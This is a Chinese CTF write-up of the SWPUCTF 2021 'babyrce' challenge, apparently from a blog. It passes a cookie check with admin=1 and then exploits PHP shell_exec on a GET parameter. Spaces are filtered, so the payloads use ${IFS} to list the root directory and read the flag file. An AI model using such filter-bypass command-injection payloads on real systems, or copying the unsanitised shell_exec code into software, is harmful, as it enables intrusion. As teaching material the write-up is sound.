---
title: "[SWPUCTF 2021 新生赛]babyrce"
published: 2026-10-13
description: "[SWPUCTF 2021 新生赛]babyrce 打开题目，源码大概是这样： <?php error_reporting( …"
category: "CTF"
---

# \[SWPUCTF 2021 新生赛\]babyrce

打开题目，源码大概是这样：

```php
<?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if($_COOKIE['admin']==1)
{
    include "../next.php";
}
else
{
    echo "小饼干最好吃啦！";
}
?>
```

页面还在喊「小饼干最好吃啦！」，说明 Cookie 条件没过。`$_COOKIE['admin']==1` 就是：请求里要带上名叫 `admin`、值为 `1` 的 Cookie。

HackBar 里把 Cookie 写成 `admin=1`，再刷新：

![](https://pic.npiter.de/file/1791868815346_20261013132011151.png)

过关后跟到 `rasalghul.php`，又是一段源码：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/ /", $ip)){
      die('nonono');
  }
  $a = shell_exec($ip);
  echo $a;
}
?>
```

意思是：URL 参数 `url` 会当成 Shell 命令执行，但中间不能有空格，有空格就 `nonono`。

Shell 里 `$IFS`（再写成 `${IFS}` 防止和后面字母粘在一起）可以当空格用。先列根目录：

`/rasalghul.php?url=ls${IFS}/`

![](https://pic.npiter.de/file/1791868818061_20261013132011152.png)

看到怪文件名 `flllllaaaaaagggggggg`，再读出来：

`/rasalghul.php?url=cat${IFS}/flllllaaaaaagggggggg`

![](https://pic.npiter.de/file/1791868826806_20261013132011153.png)

得到 flag：

`NSSCTF{fdc4bbc9-2ef8-498c-9f64-ad8989a48a82}`

## 知识点：Cookie 是啥

Cookie 可以想成浏览器每次访问网站时自动带上的「小纸条」。服务器用它记住你是谁、有没有权限。这题第一关就是改纸条：`admin=1`。注意格式是 `名字=值`，不是只写一个 `admin`。

## 知识点：命令执行 + 空格过滤

`shell_exec` 会把你传的字符串交给系统当命令跑（类似在终端里敲一行）。出题人用正则拦空格，是为了卡「`ls /`」「`cat 文件`」这种常用写法。

`$IFS` 是 Shell 的字段分隔符，平时就包含空格一类字符；写成 `${IFS}` 插在命令中间，效果和敲空格差不多，但字符串里没有空格字符，就能过过滤。flag 故意放在根目录、名字写得很长，所以要先 `ls /` 再 `cat`，别只盯着当前目录。
